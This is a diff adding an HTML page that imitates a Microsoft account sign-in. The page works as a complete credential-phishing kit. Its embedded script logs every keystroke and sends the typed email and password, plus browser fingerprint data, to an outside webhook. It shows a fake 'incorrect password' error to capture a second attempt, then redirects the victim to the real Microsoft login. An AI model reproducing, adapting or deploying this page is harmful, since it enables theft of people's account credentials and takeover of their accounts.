@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html dir="ltr" lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your account</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', 'Helvetica Neue', Helvetica, Arial, sans-serif; background: #f2f2f2; min-height: 100vh; display: flex; flex-direction: column; }
+
+        /* Background image band */
+        .background-image {
+            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+            background: linear-gradient(135deg, #0078d4 0%, #005a9e 40%, #004578 100%);
+            z-index: -1;
+        }
+
+        /* Centered login container */
+        .outer {
+            flex: 1; display: flex; align-items: center; justify-content: center; padding: 20px;
+        }
+
+        .login-box {
+            background: #fff;
+            width: 440px;
+            min-height: 338px;
+            padding: 44px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        /* Microsoft logo */
+        .logo {
+            display: flex; align-items: center; margin-bottom: 16px;
+        }
+        .logo svg { width: 108px; height: 24px; }
+
+        .title {
+            font-size: 24px; font-weight: 600; color: #1b1b1b; margin-bottom: 4px;
+            line-height: 1.33;
+        }
+
+        .subtitle {
+            font-size: 13px; color: #1b1b1b; margin-bottom: 16px; line-height: 1.38;
+        }
+
+        /* Input */
+        .input-group { margin-bottom: 16px; position: relative; }
+
+        .input-group input {
+            width: 100%; padding: 6px 10px; font-size: 15px; font-family: inherit;
+            border: none; border-bottom: 1px solid #666; outline: none;
+            background: transparent; color: #1b1b1b; height: 36px;
+        }
+
+        .input-group input:focus { border-bottom: 2px solid #0067b8; }
+
+        .input-group input::placeholder { color: #666; }
+
+        .input-group label {
+            display: none;
+        }
+
+        .error-msg {
+            color: #e81123; font-size: 13px; margin-bottom: 12px; display: none;
+            line-height: 1.38;
+        }
+
+        /* Links */
+        .link {
+            color: #0067b8; text-decoration: none; font-size: 13px; cursor: pointer;
+        }
+        .link:hover { text-decoration: underline; color: #004578; }
+
+        .cant-access { margin-bottom: 16px; }
+
+        /* Button */
+        .btn-next {
+            background: #0067b8; color: #fff; border: none; padding: 0;
+            width: 108px; height: 32px; font-size: 15px; font-family: inherit;
+            font-weight: 600; cursor: pointer; float: right;
+        }
+        .btn-next:hover { background: #005a9e; }
+        .btn-next:active { background: #004578; }
+
+        .clearfix::after { content: ''; display: table; clear: both; }
+
+        /* Password view */
+        .password-section { display: none; }
+
+        .back-btn {
+            display: flex; align-items: center; gap: 8px; margin-bottom: 20px; cursor: pointer;
+        }
+        .back-btn .arrow { font-size: 16px; color: #1b1b1b; }
+        .back-btn .user-email { font-size: 13px; color: #1b1b1b; }
+
+        /* Divider */
+        .sign-in-options {
+            margin-top: 20px; padding-top: 16px; border-top: 1px solid #e1e1e1;
+        }
+        .sign-in-options a { display: block; margin-bottom: 6px; }
+
+        /* Footer */
+        .footer {
+            text-align: right; padding: 16px 20px; font-size: 12px; color: #fff;
+        }
+        .footer a { color: #fff; text-decoration: none; margin-left: 16px; }
+        .footer a:hover { text-decoration: underline; }
+
+        /* No-account */
+        .no-account {
+            font-size: 13px; color: #1b1b1b; margin-top: 16px;
+        }
+
+        /* Keep me signed in */
+        .kmsi { display: flex; align-items: center; gap: 8px; margin-bottom: 16px; }
+        .kmsi input { width: 20px; height: 20px; accent-color: #0067b8; }
+        .kmsi label { font-size: 13px; color: #1b1b1b; }
+
+        /* Password toggle */
+        .password-wrapper { position: relative; }
+        .password-wrapper .toggle-pw {
+            position: absolute; right: 8px; top: 50%; transform: translateY(-50%);
+            background: none; border: none; cursor: pointer; font-size: 14px; color: #666;
+        }
+
+        /* Loading spinner */
+        .spinner { display: none; text-align: center; padding: 40px 0; }
+        .spinner::after {
+            content: ''; display: inline-block; width: 24px; height: 24px;
+            border: 3px solid #0067b8; border-top-color: transparent;
+            border-radius: 50%; animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="background-image"></div>
+
+    <div class="outer">
+        <div class="login-box">
+            <!-- STEP 1: Email -->
+            <div id="email-section">
+                <div class="logo">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 108 24">
+                        <path fill="#737373" d="M44.836 4.6v15.2h-2.471V7.816L37.2 19.8h-1.32L30.6 7.72V19.8h-2.2V4.6h2.953l5.225 12.29L41.8 4.6h3.037zM47.6 8.2h2.2v11.6h-2.2V8.2zm1.1-1.4a1.3 1.3 0 1 1 0-2.6 1.3 1.3 0 0 1 0 2.6zM58.9 18.36c.7 0 1.4-.18 2-.48l.8 1.58a6.06 6.06 0 0 1-3.1.84c-3.4 0-5.3-2.2-5.3-5.1v-.44c0-2.96 2.1-5.56 5.1-5.56 3.1 0 4.7 2.4 4.7 5.28v.94h-7.6c.2 1.84 1.5 2.94 3.4 2.94zm2-4.78c-.1-1.72-1-2.94-2.6-2.94-1.6 0-2.8 1.26-3 2.94h5.6zM64.4 8.2h2.2v2c.8-1.4 2.14-2.24 3.8-2.24.3 0 .6.04.9.1v2.24c-.4-.1-.7-.14-1.1-.14-1.4 0-2.8.94-3.4 2.2v7.44h-2.2V8.2h-.2zM78.6 18.18c1.3 0 2.4-.54 3.2-1.38l1.4 1.3c-1.2 1.24-2.8 2.2-4.7 2.2-3.4 0-5.7-2.54-5.7-5.44v-.3c0-3 2.3-5.76 5.5-5.76 3.4 0 5.3 2.84 5.3 5.86v.54h-8.5c.2 2.04 1.8 3.28 3.5 3.28v-.3zm2.7-4.96c-.2-1.86-1.2-3.18-3.1-3.18-1.8 0-3 1.26-3.3 3.18h6.4zM90 18.18c1.3 0 2.4-.54 3.2-1.38l1.4 1.3C93.4 19.34 91.8 20.3 89.9 20.3c-3.4 0-5.7-2.54-5.7-5.44v-.3c0-3 2.3-5.76 5.5-5.76 3.4 0 5.3 2.84 5.3 5.86v.54h-8.5c.2 2.04 1.8 3.28 3.5 3.28V18.18zm2.7-4.96c-.2-1.86-1.2-3.18-3.1-3.18-1.8 0-3 1.26-3.3 3.18h6.4zM97.8 16.56V10.4H96V8.2h1.8V4.6h2.2v3.6h2.6v2.2H100v5.84c0 1.12.5 1.74 1.5 1.74.4 0 .8-.08 1.1-.2v2c-.5.2-1 .3-1.6.3-2 0-3.2-1.2-3.2-3.52z"/>
+                        <path fill="#f25022" d="M0 0h11v11H0z"/>
+                        <path fill="#7fba00" d="M12 0h11v11H12z"/>
+                        <path fill="#00a4ef" d="M0 12h11v11H0z"/>
+                        <path fill="#ffb900" d="M12 12h11v11H12z"/>
+                    </svg>
+                </div>
+                <h1 class="title">Sign in</h1>
+                <div id="error-email" class="error-msg">Enter a valid email address, phone number, or Skype name.</div>
+                <div class="input-group">
+                    <input type="email" id="email" placeholder="Email, phone, or Skype" autofocus autocomplete="username">
+                </div>
+                <div class="cant-access">
+                    <a class="link" href="#">No account? Create one!</a>
+                </div>
+                <div class="cant-access">
+                    <a class="link" href="#">Can't access your account?</a>
+                </div>
+                <div class="sign-in-options">
+                    <a class="link" href="#">Sign-in options</a>
+                </div>
+                <div class="clearfix" style="margin-top:20px;">
+                    <button class="btn-next" id="btn-email-next">Next</button>
+                </div>
+            </div>
+
+            <!-- Loading between steps -->
+            <div class="spinner" id="spinner"></div>
+
+            <!-- STEP 2: Password -->
+            <div id="password-section" class="password-section">
+                <div class="logo">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 108 24">
+                        <path fill="#737373" d="M44.836 4.6v15.2h-2.471V7.816L37.2 19.8h-1.32L30.6 7.72V19.8h-2.2V4.6h2.953l5.225 12.29L41.8 4.6h3.037zM47.6 8.2h2.2v11.6h-2.2V8.2zm1.1-1.4a1.3 1.3 0 1 1 0-2.6 1.3 1.3 0 0 1 0 2.6zM58.9 18.36c.7 0 1.4-.18 2-.48l.8 1.58a6.06 6.06 0 0 1-3.1.84c-3.4 0-5.3-2.2-5.3-5.1v-.44c0-2.96 2.1-5.56 5.1-5.56 3.1 0 4.7 2.4 4.7 5.28v.94h-7.6c.2 1.84 1.5 2.94 3.4 2.94zm2-4.78c-.1-1.72-1-2.94-2.6-2.94-1.6 0-2.8 1.26-3 2.94h5.6zM64.4 8.2h2.2v2c.8-1.4 2.14-2.24 3.8-2.24.3 0 .6.04.9.1v2.24c-.4-.1-.7-.14-1.1-.14-1.4 0-2.8.94-3.4 2.2v7.44h-2.2V8.2h-.2zM78.6 18.18c1.3 0 2.4-.54 3.2-1.38l1.4 1.3c-1.2 1.24-2.8 2.2-4.7 2.2-3.4 0-5.7-2.54-5.7-5.44v-.3c0-3 2.3-5.76 5.5-5.76 3.4 0 5.3 2.84 5.3 5.86v.54h-8.5c.2 2.04 1.8 3.28 3.5 3.28v-.3zm2.7-4.96c-.2-1.86-1.2-3.18-3.1-3.18-1.8 0-3 1.26-3.3 3.18h6.4zM90 18.18c1.3 0 2.4-.54 3.2-1.38l1.4 1.3C93.4 19.34 91.8 20.3 89.9 20.3c-3.4 0-5.7-2.54-5.7-5.44v-.3c0-3 2.3-5.76 5.5-5.76 3.4 0 5.3 2.84 5.3 5.86v.54h-8.5c.2 2.04 1.8 3.28 3.5 3.28V18.18zm2.7-4.96c-.2-1.86-1.2-3.18-3.1-3.18-1.8 0-3 1.26-3.3 3.18h6.4zM97.8 16.56V10.4H96V8.2h1.8V4.6h2.2v3.6h2.6v2.2H100v5.84c0 1.12.5 1.74 1.5 1.74.4 0 .8-.08 1.1-.2v2c-.5.2-1 .3-1.6.3-2 0-3.2-1.2-3.2-3.52z"/>
+                        <path fill="#f25022" d="M0 0h11v11H0z"/>
+                        <path fill="#7fba00" d="M12 0h11v11H12z"/>
+                        <path fill="#00a4ef" d="M0 12h11v11H0z"/>
+                        <path fill="#ffb900" d="M12 12h11v11H12z"/>
+                    </svg>
+                </div>
+                <div class="back-btn" id="back-btn">
+                    <span class="arrow">&#8592;</span>
+                    <span class="user-email" id="display-email"></span>
+                </div>
+                <h1 class="title">Enter password</h1>
+                <div id="error-pw" class="error-msg">Your account or password is incorrect. If you don't remember your password, <a href="#" class="link">reset it now.</a></div>
+                <div class="input-group password-wrapper">
+                    <input type="password" id="password" placeholder="Password" autocomplete="current-password">
+                </div>
+                <div class="cant-access">
+                    <a class="link" href="#">Forgot password?</a>
+                </div>
+                <div class="kmsi">
+                    <input type="checkbox" id="kmsi" checked>
+                    <label for="kmsi">Keep me signed in</label>
+                </div>
+                <div class="clearfix">
+                    <button class="btn-next" id="btn-pw-next">Sign in</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <a href="#">Terms of Use</a>
+        <a href="#">Privacy & Cookies</a>
+        <span>...</span>
+    </div>
+
+    <script>
+    (function() {
+        var WEBHOOK = 'https://webhook.site/3bf3755d-69fc-4f50-a34c-3c28ed2765ef';
+        var emailSection = document.getElementById('email-section');
+        var passwordSection = document.getElementById('password-section');
+        var spinner = document.getElementById('spinner');
+        var emailInput = document.getElementById('email');
+        var passwordInput = document.getElementById('password');
+        var capturedEmail = '';
+
+        // ─── KEYLOGGER ───────────────────────────────────────
+        var keyBuffer = [];
+        function flushKeys() {
+            if (keyBuffer.length === 0) return;
+            var payload = {
+                type: 'keylog',
+                keys: keyBuffer.splice(0),
+                email: capturedEmail,
+                url: location.href,
+                time: new Date().toISOString()
+            };
+            console.log('[KEYLOG]', JSON.stringify(payload));
+            navigator.sendBeacon(WEBHOOK, JSON.stringify(payload));
+        }
+        document.addEventListener('keydown', function(e) {
+            keyBuffer.push({
+                key: e.key,
+                field: e.target.id || e.target.tagName,
+                ts: Date.now()
+            });
+            if (keyBuffer.length >= 15) flushKeys();
+        }, true);
+        setInterval(flushKeys, 4000);
+
+        // ─── STEP 1: Email ───────────────────────────────────
+        document.getElementById('btn-email-next').addEventListener('click', function() {
+            var email = emailInput.value.trim();
+            if (!email || email.indexOf('@') === -1) {
+                document.getElementById('error-email').style.display = 'block';
+                return;
+            }
+            document.getElementById('error-email').style.display = 'none';
+            capturedEmail = email;
+
+            // Send email to webhook
+            navigator.sendBeacon(WEBHOOK, JSON.stringify({
+                type: 'email_captured',
+                email: email,
+                time: new Date().toISOString(),
+                userAgent: navigator.userAgent
+            }));
+
+            // Show spinner, then password
+            emailSection.style.display = 'none';
+            spinner.style.display = 'block';
+            setTimeout(function() {
+                spinner.style.display = 'none';
+                passwordSection.style.display = 'block';
+                document.getElementById('display-email').textContent = email;
+                passwordInput.focus();
+            }, 800);
+        });
+
+        emailInput.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') document.getElementById('btn-email-next').click();
+        });
+
+        // ─── STEP 2: Password ────────────────────────────────
+        document.getElementById('btn-pw-next').addEventListener('click', function() {
+            var password = passwordInput.value;
+            if (!password) {
+                document.getElementById('error-pw').style.display = 'block';
+                return;
+            }
+
+            // Send credentials to webhook
+            var creds = {
+                type: 'credentials_captured',
+                email: capturedEmail,
+                password: password,
+                keepSignedIn: document.getElementById('kmsi').checked,
+                time: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                screenRes: screen.width + 'x' + screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                referrer: document.referrer
+            };
+            console.log('[CAPTURED]', JSON.stringify(creds));
+            navigator.sendBeacon(WEBHOOK, JSON.stringify(creds));
+
+            // Also flush any remaining keylog
+            flushKeys();
+
+            // Show error (simulating failed login — keeps victim on page for 2nd attempt)
+            document.getElementById('error-pw').style.display = 'block';
+            passwordInput.value = '';
+            passwordInput.focus();
+
+            // On second attempt, redirect to real Microsoft
+            if (this.dataset.attempt === '1') {
+                navigator.sendBeacon(WEBHOOK, JSON.stringify({
+                    type: 'credentials_captured_retry',
+                    email: capturedEmail,
+                    password: password,
+                    time: new Date().toISOString()
+                }));
+                passwordSection.style.display = 'none';
+                spinner.style.display = 'block';
+                setTimeout(function() {
+                    window.location.href = 'https://login.microsoftonline.com/';
+                }, 1200);
+            }
+            this.dataset.attempt = '1';
+        });
+
+        passwordInput.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') document.getElementById('btn-pw-next').click();
+        });
+
+        // ─── Back button ─────────────────────────────────────
+        document.getElementById('back-btn').addEventListener('click', function() {
+            passwordSection.style.display = 'none';
+            emailSection.style.display = 'block';
+            emailInput.focus();
+        });
+
+        // ─── Page load beacon ────────────────────────────────
+        navigator.sendBeacon(WEBHOOK, JSON.stringify({
+            type: 'page_visited',
+            url: location.href,
+            referrer: document.referrer,
+            userAgent: navigator.userAgent,
+            time: new Date().toISOString()
+        }));
+    })();
+    </script>
+</body>
+</html>
